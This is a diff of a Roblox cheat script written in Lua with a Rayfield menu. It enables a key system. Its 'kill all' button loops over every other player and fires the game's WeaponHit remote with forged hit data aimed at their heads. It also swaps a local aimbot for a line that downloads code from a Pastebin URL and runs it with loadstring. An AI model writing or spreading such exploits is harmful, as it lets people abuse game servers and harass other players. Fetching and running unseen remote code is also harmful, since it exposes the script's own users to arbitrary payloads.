@@ -25,7 +25,7 @@ local Window = Rayfield:CreateWindow({
       RememberJoins = true -- Set this to false to make them join the Discord every time they load it up
    },
 
-   KeySystem = false, -- Set this to true to use our key system
+   KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
       Title = "keysystem",
       Subtitle = "Get Key",
@@ -91,151 +91,36 @@ local Button = ITab:CreateButton({
    Callback = function()
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local UIS = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
 
-local gui = Instance.new("ScreenGui")
-gui.Parent = player.PlayerGui
+local tool = player.Backpack:FindFirstChild("spas12") or player.Character:FindFirstChild("spas12")
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0,200,0,120)
-frame.Position = UDim2.new(0.4,0,0.4,0)
-frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
-frame.Parent = gui
-
--- botão fechar
-local close = Instance.new("TextButton")
-close.Size = UDim2.new(0,30,0,30)
-close.Position = UDim2.new(1,-30,0,0)
-close.Text = "X"
-close.BackgroundColor3 = Color3.fromRGB(170,0,0)
-close.Parent = frame
-
-close.MouseButton1Click:Connect(function()
-	gui:Destroy()
-end)
-
--- botão kill all
-local killAll = Instance.new("TextButton")
-killAll.Size = UDim2.new(1,-20,0,40)
-killAll.Position = UDim2.new(0,10,0,50)
-killAll.Text = "KILL ALL"
-killAll.BackgroundColor3 = Color3.fromRGB(200,0,0)
-killAll.Parent = frame
-
-killAll.MouseButton1Click:Connect(function()
-
-	for _,plr in pairs(Players:GetPlayers()) do
-		if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-
-			local args = {
-				player.Backpack:FindFirstChild("spas12"),
-				{
-					p = plr.Character.HumanoidRootPart.Position,
-					pid = 2,
-					part = plr.Character.HumanoidRootPart,
-					d = 10,
-					maxDist = 100,
-					h = plr.Character.HumanoidRootPart,
-					m = Enum.Material.Plastic,
-					n = Vector3.yAxis,
-					t = 0,
-					sid = 6
-				}
+for _,plr in pairs(Players:GetPlayers()) do
+	if plr ~= player and plr.Character and plr.Character:FindFirstChild("Head") then
+		
+		local args = {
+			tool,
+			{
+				p = plr.Character.Head.Position,
+				part = plr.Character.Head,
+				h = plr.Character.Head
 			}
+		}
 
-			ReplicatedStorage.WeaponsSystem.Network.WeaponHit:FireServer(unpack(args))
-
-		end
+		ReplicatedStorage.WeaponsSystem.Network.WeaponHit:FireServer(unpack(args))
+		
 	end
-
-end)
-
--- SISTEMA DE ARRASTAR
-
-local dragging = false
-local dragInput
-local dragStart
-local startPos
-
-local function update(input)
-	local delta = input.Position - dragStart
-	frame.Position = UDim2.new(
-		startPos.X.Scale,
-		startPos.X.Offset + delta.X,
-		startPos.Y.Scale,
-		startPos.Y.Offset + delta.Y
-	)
 end
-
-frame.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		dragging = true
-		dragStart = input.Position
-		startPos = frame.Position
-
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
-end)
-
-frame.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement then
-		dragInput = input
-	end
-end)
-
-UIS.InputChanged:Connect(function(input)
-	if input == dragInput and dragging then
-		update(input)
-	end
-end)
    end,
 })
 
 local Button = ITab:CreateButton({
    Name = "Aimbot 🎯",
    Callback = function()
-    local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-
-local player = Players.LocalPlayer
-local camera = workspace.CurrentCamera
-
-local targetPlayer = nil
-
--- pega um jogador para testar
-for _,plr in pairs(Players:GetPlayers()) do
-	if plr ~= player then
-		targetPlayer = plr
-		break
-	end
-end
-
-RunService.RenderStepped:Connect(function()
-
-	if targetPlayer 
-	and targetPlayer.Character 
-	and targetPlayer.Character:FindFirstChild("Head") then
-		
-		local head = targetPlayer.Character.Head
-		
-		local camPos = camera.CFrame.Position
-		local targetCF = CFrame.new(camPos, head.Position)
-		
-		-- movimento suave
-		camera.CFrame = camera.CFrame:Lerp(targetCF, 0.1)
-
-	end
-
-end)
-   end,
+loadstring(game:HttpGet("https://pastebin.com/raw/qtZt0Nzb"))()
+ end,
 })
-
 local ETab = Window:CreateTab("❄️ ESP ❄️", nil) -- Title, Image
 local Section = ETab:CreateSection("ESP")
 
